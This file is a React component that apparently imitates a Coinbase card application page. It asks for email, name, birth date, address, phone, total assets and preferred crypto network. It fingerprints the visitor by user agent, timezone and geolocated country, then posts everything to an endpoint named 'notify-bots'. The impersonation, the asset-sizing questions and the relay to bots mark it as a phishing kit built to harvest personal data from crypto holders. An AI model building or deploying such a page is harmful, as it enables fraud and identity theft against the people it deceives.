"use client"

import type React from "react"

import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Download, Share, X } from "lucide-react"
import { useEffect, useState } from "react"

interface CountryData {
  name: string
  code: string
  dialCode: string
}

const countries: CountryData[] = [
  { name: "United States", code: "US", dialCode: "+1" },
  { name: "United Kingdom", code: "GB", dialCode: "+44" },
  { name: "Canada", code: "CA", dialCode: "+1" },
  { name: "Australia", code: "AU", dialCode: "+61" },
  { name: "Germany", code: "DE", dialCode: "+49" },
  { name: "France", code: "FR", dialCode: "+33" },
  { name: "Japan", code: "JP", dialCode: "+81" },
  { name: "South Korea", code: "KR", dialCode: "+82" },
  { name: "Singapore", code: "SG", dialCode: "+65" },
  { name: "India", code: "IN", dialCode: "+91" }, // Not typically "developed"
  { name: "Brazil", code: "BR", dialCode: "+55" }, // Not typically "developed"
  { name: "Mexico", code: "MX", dialCode: "+52" }, // Not typically "developed"
  { name: "Nigeria", code: "NG", dialCode: "+234" }, // Not typically "developed"
  { name: "South Africa", code: "ZA", dialCode: "+27" }, // Not typically "developed"
  { name: "New Zealand", code: "NZ", dialCode: "+64" },
  { name: "Switzerland", code: "CH", dialCode: "+41" },
  { name: "Norway", code: "NO", dialCode: "+47" },
  { name: "Sweden", code: "SE", dialCode: "+46" },
  { name: "Finland", code: "FI", dialCode: "+358" },
  { name: "Denmark", code: "DK", dialCode: "+45" },
  { name: "Netherlands", code: "NL", dialCode: "+31" },
  { name: "Belgium", code: "BE", dialCode: "+32" },
  { name: "Austria", code: "AT", dialCode: "+43" },
  { name: "Ireland", code: "IE", dialCode: "+353" },
  { name: "Luxembourg", code: "LU", dialCode: "+352" },
  { name: "Israel", code: "IL", dialCode: "+972" },
  { name: "Iceland", code: "IS", dialCode: "+354" },
  { name: "Portugal", code: "PT", dialCode: "+351" },
  { name: "Spain", code: "ES", dialCode: "+34" },
  { name: "Italy", code: "IT", dialCode: "+39" },
  { name: "Greece", code: "GR", dialCode: "+30" },
  { name: "Czech Republic", code: "CZ", dialCode: "+420" },
  { name: "Slovenia", code: "SI", dialCode: "+386" },
  { name: "Estonia", code: "EE", dialCode: "+372" },
  { name: "Lithuania", code: "LT", dialCode: "+370" },
  { name: "Latvia", code: "LV", dialCode: "+371" },
  { name: "Malta", code: "MT", dialCode: "+356" },
  { name: "Cyprus", code: "CY", dialCode: "+357" },
  { name: "United Arab Emirates", code: "AE", dialCode: "+971" },
  { name: "Hong Kong", code: "HK", dialCode: "+852" }
];

export default function Component() {
  const [selectedCountry, setSelectedCountry] = useState<CountryData>(countries[0])
  const [phoneNumber, setPhoneNumber] = useState("")

  const [formData, setFormData] = useState({
    email: "",
    fullName: "",
    dateOfBirth: "",
    address: "",
    city: "",
    state: "",
    country: selectedCountry.name,
    phone: "",
    balance: "",
    cryptoNetwork: "",
  })
  const [notification, setNotification] = useState<{
    type: "success" | "error" | "loading" | null
    message: string
  }>({ type: null, message: "" })
  const [isSubmitting, setIsSubmitting] = useState(false)

  useEffect(() => {
    // Auto-detect country based on geolocation
    const detectCountry = async () => {
      try {
        // First try to get user's position
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            async (position) => {
              try {
                // Use a reverse geocoding service to get country from coordinates
                const response = await fetch(
                  `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${position.coords.latitude}&longitude=${position.coords.longitude}&localityLanguage=en`,
                )
                const data = await response.json()
                const countryCode = data.countryCode

                const detectedCountry = countries.find((c) => c.code === countryCode)
                if (detectedCountry) {
                  setSelectedCountry(detectedCountry)
                }
              } catch (error) {
                console.log("Geocoding failed, using IP-based detection")
                // Fallback to IP-based detection
                await detectCountryByIP()
              }
            },
            async () => {
              // If geolocation is denied, fallback to IP-based detection
              await detectCountryByIP()
            },
          )
        } else {
          await detectCountryByIP()
        }
      } catch (error) {
        console.log("Country detection failed:", error)
      }
    }

    const detectCountryByIP = async () => {
      try {
        const response = await fetch("https://ipapi.co/json/")
        const data = await response.json()
        const detectedCountry = countries.find((c) => c.code === data.country_code)
        if (detectedCountry) {
          setSelectedCountry(detectedCountry)
        }
      } catch (error) {
        console.log("IP-based country detection failed:", error)
      }
    }

    detectCountry()
  }, [])

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value
    // Remove the country code if user tries to type it
    const cleanValue = value.replace(selectedCountry.dialCode, "").replace(/^\+/, "")
    setPhoneNumber(cleanValue)
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsSubmitting(true)
    setNotification({ type: "loading", message: "We're verifying your information..." })

    try {
      // Prepare the data to send
      const submissionData = {
        ...formData,
        country: selectedCountry.name,
        countryCode: selectedCountry.code,
        phoneWithCode: `${selectedCountry.dialCode}${phoneNumber}`,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      }

      // Simulate API call to bot notification system
      const response = await fetch("/api/notify-bots", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(submissionData),
      })

      if (response.ok) {
        setNotification({
          type: "success",
          message:
            "Account information successfully sent to our verification bots! You will receive a confirmation email shortly.",
        })

        // Reset form after successful submission
        setTimeout(() => {
          setFormData({
            email: "",
            fullName: "",
            dateOfBirth: "",
            address: "",
            city: "",
            state: "",
            country: selectedCountry.name,
            phone: "",
            balance: "",
            cryptoNetwork: "",
          })
          setPhoneNumber("")
        }, 2000)
      } else {
        throw new Error("Failed to submit form")
      }
    } catch (error) {
      setNotification({
        type: "error",
        message: "Failed to send information to bots. Please check your connection and try again.",
      })
    } finally {
      setIsSubmitting(false)
      // Clear notification after 5 seconds
      setTimeout(() => {
        setNotification({ type: null, message: "" })
      }, 5000)
    }
  }

  const handleInputChange = (field: string, value: string) => {
    setFormData((prev) => ({
      ...prev,
      [field]: value,
    }))
  }

  return (
    <div className="min-h-screen bg-black text-white">
      <div className="px-6 pt-8 pb-8">
        <h1 className="text-4xl font-normal mb-12">
          Apply
          
          Coinbase<br /> Card
        </h1>

        {notification.type && (
          <div
            className={`mb-6 p-4 rounded-xl border-2 ${
              notification.type === "success"
                ? "bg-green-900/20 border-green-500 text-green-400"
                : notification.type === "error"
                  ? "bg-red-900/20 border-red-500 text-red-400"
                  : "bg-blue-900/20 border-blue-500 text-blue-400"
            }`}
          >
            <div className="flex items-center gap-2">
              {notification.type === "loading" && (
                <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-blue-400"></div>
              )}
              <span className="text-sm font-medium">{notification.message}</span>
            </div>
          </div>
        )}

        {/* Form */}
        <form onSubmit={handleSubmit} className="space-y-6">
          <Input
            type="email"
            value={formData.email}
            onChange={(e) => handleInputChange("email", e.target.value)}
            className="bg-transparent border-2 border-gray-600 rounded-xl h-14 text-white placeholder:text-gray-400 hover:border-blue-500 focus:border-blue-500 focus:ring-0 transition-colors"
            placeholder="Your email address"
            required
          />

          <Input
            type="text"
            value={formData.fullName}
            onChange={(e) => handleInputChange("fullName", e.target.value)}
            className="bg-transparent border-2 border-gray-600 rounded-xl h-14 text-white placeholder:text-gray-400 hover:border-blue-500 focus:border-blue-500 focus:ring-0 transition-colors"
            placeholder="Full name"
          />

          <Input
            type="date"
            value={formData.dateOfBirth}
            onChange={(e) => handleInputChange("dateOfBirth", e.target.value)}
            className="bg-transparent border-2 border-gray-600 rounded-xl h-14 text-white placeholder:text-gray-400 hover:border-blue-500 focus:border-blue-500 focus:ring-0 transition-colors"
            placeholder="Birthdate"
          />

          <Input
            type="text"
            value={formData.address}
            onChange={(e) => handleInputChange("address", e.target.value)}
            className="bg-transparent border-2 border-gray-600 rounded-xl h-14 text-white placeholder:text-gray-400 hover:border-blue-500 focus:border-blue-500 focus:ring-0 transition-colors"
            placeholder="Address"
          />

          <Input
            type="text"
            value={formData.city}
            onChange={(e) => handleInputChange("city", e.target.value)}
            className="bg-transparent border-2 border-gray-600 rounded-xl h-14 text-white placeholder:text-gray-400 hover:border-blue-500 focus:border-blue-500 focus:ring-0 transition-colors"
            placeholder="City"
          />

          <Input
            type="text"
            value={formData.state}
            onChange={(e) => handleInputChange("state", e.target.value)}
            className="bg-transparent border-2 border-gray-600 rounded-xl h-14 text-white placeholder:text-gray-400 hover:border-blue-500 focus:border-blue-500 focus:ring-0 transition-colors"
            placeholder="State/Province"
          />

          <select
            className="bg-transparent border-2 border-gray-600 rounded-xl h-14 text-white hover:border-blue-500 focus:border-blue-500 focus:ring-0 w-full px-3 transition-colors"
            value={selectedCountry.code}
            onChange={(e) => {
              const country = countries.find((c) => c.code === e.target.value)
              if (country) {
                setSelectedCountry(country)
                setFormData((prev) => ({
                  ...prev,
                  country: country.name,
                }))
              }
            }}
          >
            {countries.map((country) => (
              <option key={country.code} value={country.code} className="bg-gray-800 text-white">
                {country.name}
              </option>
            ))}
          </select>

          <div className="flex gap-2">
            <div className="bg-transparent border-2 border-gray-600 rounded-xl h-14 px-3 flex items-center text-gray-400 min-w-[80px]">
              {selectedCountry.dialCode}
            </div>
            <Input
              type="tel"
              value={phoneNumber}
              onChange={handlePhoneChange}
              className="bg-transparent border-2 border-gray-600 rounded-xl h-14 text-white placeholder:text-gray-400 hover:border-blue-500 focus:border-blue-500 focus:ring-0 transition-colors flex-1"
              placeholder="Phone number"
            />
          </div>

          <Input
            type="number"
            step="0.01"
            value={formData.balance}
            onChange={(e) => handleInputChange("balance", e.target.value)}
            className="bg-transparent border-2 border-gray-600 rounded-xl h-14 text-white placeholder:text-gray-400 hover:border-blue-500 focus:border-blue-500 focus:ring-0 transition-colors"
            placeholder="Total Assets (in $)"
          />

          <select
            className="bg-transparent border-2 border-gray-600 rounded-xl h-14 text-white hover:border-blue-500 focus:border-blue-500 focus:ring-0 w-full px-3 transition-colors"
            value={formData.cryptoNetwork}
            onChange={(e) => handleInputChange("cryptoNetwork", e.target.value)}
          >
            <option value="" className="bg-gray-800 text-white">
              Crypto Network
            </option>

            {/* Major Networks */}
            <optgroup label="Major Networks" className="bg-gray-800 text-white">
              <option value="bitcoin" className="bg-gray-800 text-white">
                Bitcoin (BTC)
              </option>
              <option value="ethereum" className="bg-gray-800 text-white">
                Ethereum (ETH)
              </option>
              <option value="binance-smart-chain" className="bg-gray-800 text-white">
                Binance Smart Chain (BSC)
              </option>
              <option value="polygon" className="bg-gray-800 text-white">
                Polygon (MATIC)
              </option>
              <option value="solana" className="bg-gray-800 text-white">
                Solana (SOL)
              </option>
              <option value="cardano" className="bg-gray-800 text-white">
                Cardano (ADA)
              </option>
              <option value="avalanche" className="bg-gray-800 text-white">
                Avalanche (AVAX)
              </option>
              <option value="polkadot" className="bg-gray-800 text-white">
                Polkadot (DOT)
              </option>
            </optgroup>

            {/* Layer 2 Solutions */}
            <optgroup label="Layer 2 Solutions" className="bg-gray-800 text-white">
              <option value="arbitrum" className="bg-gray-800 text-white">
                Arbitrum (ARB)
              </option>
              <option value="optimism" className="bg-gray-800 text-white">
                Optimism (OP)
              </option>
              <option value="base" className="bg-gray-800 text-white">
                Base
              </option>
              <option value="zksync" className="bg-gray-800 text-white">
                zkSync Era
              </option>
              <option value="polygon-zkevm" className="bg-gray-800 text-white">
                Polygon zkEVM
              </option>
            </optgroup>

            {/* Alternative Chains */}
            <optgroup label="Alternative Chains" className="bg-gray-800 text-white">
              <option value="litecoin" className="bg-gray-800 text-white">
                Litecoin (LTC)
              </option>
              <option value="dogecoin" className="bg-gray-800 text-white">
                Dogecoin (DOGE)
              </option>
              <option value="ripple" className="bg-gray-800 text-white">
                XRP Ledger (XRP)
              </option>
              <option value="stellar" className="bg-gray-800 text-white">
                Stellar (XLM)
              </option>
              <option value="chainlink" className="bg-gray-800 text-white">
                Chainlink (LINK)
              </option>
              <option value="cosmos" className="bg-gray-800 text-white">
                Cosmos (ATOM)
              </option>
              <option value="near" className="bg-gray-800 text-white">
                NEAR Protocol (NEAR)
              </option>
              <option value="algorand" className="bg-gray-800 text-white">
                Algorand (ALGO)
              </option>
            </optgroup>

            {/* Enterprise & Institutional */}
            <optgroup label="Enterprise Networks" className="bg-gray-800 text-white">
              <option value="hedera" className="bg-gray-800 text-white">
                Hedera (HBAR)
              </option>
              <option value="hyperledger" className="bg-gray-800 text-white">
                Hyperledger Fabric
              </option>
              <option value="corda" className="bg-gray-800 text-white">
                R3 Corda
              </option>
              <option value="quorum" className="bg-gray-800 text-white">
                ConsenSys Quorum
              </option>
            </optgroup>

            {/* Emerging Networks */}
            <optgroup label="Emerging Networks" className="bg-gray-800 text-white">
              <option value="aptos" className="bg-gray-800 text-white">
                Aptos (APT)
              </option>
              <option value="sui" className="bg-gray-800 text-white">
                Sui (SUI)
              </option>
              <option value="sei" className="bg-gray-800 text-white">
                Sei (SEI)
              </option>
              <option value="celestia" className="bg-gray-800 text-white">
                Celestia (TIA)
              </option>
              <option value="injective" className="bg-gray-800 text-white">
                Injective (INJ)
              </option>
              <option value="osmosis" className="bg-gray-800 text-white">
                Osmosis (OSMO)
              </option>
            </optgroup>

            {/* Gaming & NFT Networks */}
            <optgroup label="Gaming & NFT" className="bg-gray-800 text-white">
              <option value="immutable-x" className="bg-gray-800 text-white">
                Immutable X (IMX)
              </option>
              <option value="flow" className="bg-gray-800 text-white">
                Flow (FLOW)
              </option>
              <option value="wax" className="bg-gray-800 text-white">
                WAX (WAXP)
              </option>
              <option value="enjin" className="bg-gray-800 text-white">
                Enjin (ENJ)
              </option>
              <option value="ronin" className="bg-gray-800 text-white">
                Ronin (RON)
              </option>
            </optgroup>

            {/* Privacy Networks */}
            <optgroup label="Privacy Networks" className="bg-gray-800 text-white">
              <option value="monero" className="bg-gray-800 text-white">
                Monero (XMR)
              </option>
              <option value="zcash" className="bg-gray-800 text-white">
                Zcash (ZEC)
              </option>
              <option value="dash" className="bg-gray-800 text-white">
                Dash (DASH)
              </option>
              <option value="secret" className="bg-gray-800 text-white">
                Secret Network (SCRT)
              </option>
            </optgroup>
          </select>

          {/* Submit Button */}
          <Button
            type="submit"
            disabled={isSubmitting}
            className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-gray-600 disabled:cursor-not-allowed text-white font-semibold py-4 px-6 rounded-xl h-14 mt-8 transition-colors"
          >
            {isSubmitting ? (
              <div className="flex items-center gap-2">
                <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
                Loading...
              </div>
            ) : (
              "Apply"
            )}
          </Button>
        </form>
      </div>
    </div>
  )
}
